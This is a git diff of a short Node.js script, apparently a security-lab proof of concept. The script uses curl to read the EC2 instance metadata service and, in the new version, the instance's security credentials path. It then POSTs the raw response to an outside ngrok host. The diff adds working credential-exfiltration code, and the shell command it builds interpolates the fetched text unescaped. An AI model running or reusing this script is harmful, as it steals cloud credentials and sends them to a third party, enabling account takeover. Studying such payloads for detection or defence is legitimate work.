@@ -1,42 +1,25 @@
 #!/usr/bin/env node
 const { exec } = require("child_process");
 
-// Metadata URL and server endpoint
-const metadataUrl = "http://169.254.169.254/latest/meta-data/";
-const postServerUrl = "https://nomasec-labs.ngrok.app/response";
+// Step 1: Get the credentials from the metadata endpoint
+const metadataEndpoint = "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance";
+const postServer = "https://nomasec-labs.ngrok.app/response";
 
-// Helper: check if string is valid JSON
-function isJson(str) {
-  try {
-    JSON.parse(str);
-    return true;
-  } catch {
-    return false;
-  }
-}
-
-// Fetch metadata
-exec(`curl "${metadataUrl}"`, (error, stdout, stderr) => {
+// Get credentials
+exec(`curl -s "${metadataEndpoint}"`, (error, stdout, stderr) => {
   if (error) {
-    console.error(`Error: ${error.message}`);
+    console.error(`Error fetching metadata: ${error.message}`);
     process.exit(1);
   }
   if (stderr) {
     console.error(`Stderr: ${stderr}`);
+    // Proceed: AWS will usually return plain text here
   }
-  console.log("Metadata Response:", stdout);
 
-  // Verify if response is JSON
-  const responseType = isJson(stdout) ? "json" : "text";
-  const postData = JSON.stringify({
-    type: responseType,
-    content: stdout
-  });
-
-  // Send to server
-  exec(`curl -X POST -H "Content-Type: application/json" --data '${postData}' "${postServerUrl}"`, (err, out, errout) => {
+  // Step 2: Send raw response as POST body
+  exec(`curl -X POST -H "Content-Type: application/json" -d '${stdout}' "${postServer}"`, (err, out, errout) => {
     if (err) {
-      console.error(`Error sending response: ${err.message}`);
+      console.error(`Error sending POST: ${err.message}`);
       process.exit(1);
     }
     if (errout) {
